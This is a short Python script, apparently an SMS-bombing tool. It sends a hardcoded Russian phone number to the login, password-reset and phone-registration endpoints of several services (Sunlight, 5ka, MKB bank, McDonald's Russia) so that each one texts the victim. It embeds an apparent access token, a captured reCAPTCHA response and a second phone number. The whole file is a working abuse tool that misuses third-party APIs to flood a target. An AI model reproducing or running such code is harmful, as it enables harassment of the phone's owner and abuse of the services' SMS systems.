import requests

# print("Введите номер телефона без кода страны")
# phone=input()
# print("Номер телефона " + phone)
phone = '9991253348'
headers = {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124",
    "Content-Type": "application/json", }


def sunlight():
    sunlightHeaders = headers
    sunlightHeaders.update({"Host": "api.sunlight.net", "Origin": "https://api.sunlight.net"})
    phoneSunlight = "7" + phone
    s = requests.post('https://api.sunlight.net/v3/customers/authorization/', json={"phone": phoneSunlight},
                      headers=sunlightHeaders)
    print(s.status_code)
    print(s.json())


def pyaterka():
    pPhone = "+7" + phone
    pyaterkaHeaders = headers
    pyaterkaHeaders.update({"x-Authorization": "Tokena3133e4dd44f3c7fcaa98d7a9d1f73e44ab656d0", "Host": "5ka.ru",
                            "Origin": "https://5ka.ru"})
    p = requests.post("https://5ka.ru/api/v1/services/phones/add", headers=pyaterkaHeaders, json={"number": pPhone})
    print(p.status_code)
    print(p.json())


def mkb():
    mkbHeaders = headers
    mkbHeaders.update(
        {"host": "my.mkb-am.ru", "Origin": "https://my.mkb-am.ru", "Referer": "https://my.mkb-am.ru/restore-password"})
    mkbPhone = '+7' + phone
    mkb = requests.post('https://my.mkb-am.ru/api/auth/password/reset', headers=mkbHeaders, json={"login": mkbPhone})
    print(mkb.status_code)
    print(mkb.json())
def mcdonalds():
    mcdHeaders=headers
    mcdHeaders.update({"Host":"site-api.mcdonalds.ru","Origin":"https://mcdonalds.ru"})
    mcdPhone=phone
    mcd=requests.post("https://site-api.mcdonalds.ru/api/v1/user/login/phone",headers=mcdHeaders,json={"number":"+79997854589","g-recaptcha-response":"03AGdBq27OPyEZwZGTLGh5AuLL4CwyfkdN9LiB6BwiHhVhI_G9gqw_A_Ff1O9wxUKYphC75FWI-mIfkvdGLdsoV42PY-qgGqH-PafQmDGLcWJ45Pm9meCKLtGHjirnax5Fd5CG7hLEsvjl3I9JGnZXovs60eXg1JydnvVES4CrJ4EsjdmRnTdPUEXAswNdNs4Z78IqvzU2lxCBl2EW8LTQBZC071sMgztgJ75ZHzaIOZEA7qHEb4Up6uJ8NaojfnnuVQckpLSbMPPEl-P0_jfv94juJm-D8sLr6XQHzlKxNcHJZlWy5aYmTvethgmCDH3mCUlWF2mg60Qdd7dnz1T60lz354ySwXVXpQnCSTbIK2h5zbTxjR6W-MCgfh6x0DEyIPX_xVou1UmILy8As3aRQFmaPz-jR7klxnnsjsHyPeChWU3AXGX14GkU6eC2lL3rZnYknzXf0mal"})
    print(mcd.status_code)
    print(mcd.json())
mcdonalds()
mkb()
sunlight()
pyaterka()
